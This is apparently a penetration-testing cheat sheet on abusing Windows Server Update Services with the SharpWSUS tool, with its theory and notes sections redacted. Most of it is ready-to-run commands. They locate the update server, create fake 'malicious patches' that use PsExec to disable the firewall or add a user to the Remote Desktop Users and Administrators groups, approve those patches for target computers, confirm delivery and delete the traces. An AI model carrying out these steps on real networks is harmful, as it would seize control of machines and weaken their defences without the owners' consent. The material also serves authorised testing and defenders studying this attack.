# WSUS

[Windows Server Update Services (WSUS)](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/get-started/windows-server-update-services-wsus) is a Microsoft service that allows administrators to distribute updates and patches for Microsoft products throughout an environment in a scalable way.

THEORY REDACTED
## Enumeration (local only)

https://github.com/nettitude/SharpWSUS

```powershell
# Identify if WSUS is configured and where the management server is
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
.\SharpWSUS.exe locate

# Reveal information about connected computers on management server (powershell must be executed as administrator)
.\SharpWSUS.exe inspect
```

## Exploitation (local only)

```powershell
# Create a malicious patch
.\SharpWSUS.exe create /payload:"C:\ProgramData\System\PSExec64.exe" /args:"-accepteula -s -d cmd.exe /c netsh advfirewall set allprofiles state off" /title:"DisableFirewall"
.\SharpWSUS.exe create /payload:"C:\ProgramData\System\PSExec64.exe" /args:"-accepteula -s -d cmd.exe /c net localgroup 'Remote Desktop Users' $USER /add" /title:"AddRDPUser"
.\SharpWSUS.exe create /payload:"C:\ProgramData\System\PSExec64.exe" /args:"-accepteula -s -d cmd.exe /c net localgroup Administrators $USER /add" /title:"AddAdmin"

# Approve the malicious patch for deployment
.\SharpWSUS.exe approve /updateid:$UPDATE_ID /computername:$FQDN /groupname:"$GROUP_NAME"

# Confirm group creation
.\SharpWSUS.exe inspect

# Validate client downloads
.\SharpWSUS.exe check /updateid:$UPDATE_ID /computername:$FQDN

# Cleanup
.\SharpWSUS.exe delete /updateid:$UPDATE_ID /computername:$FQDN
```

REDACTED NOTES
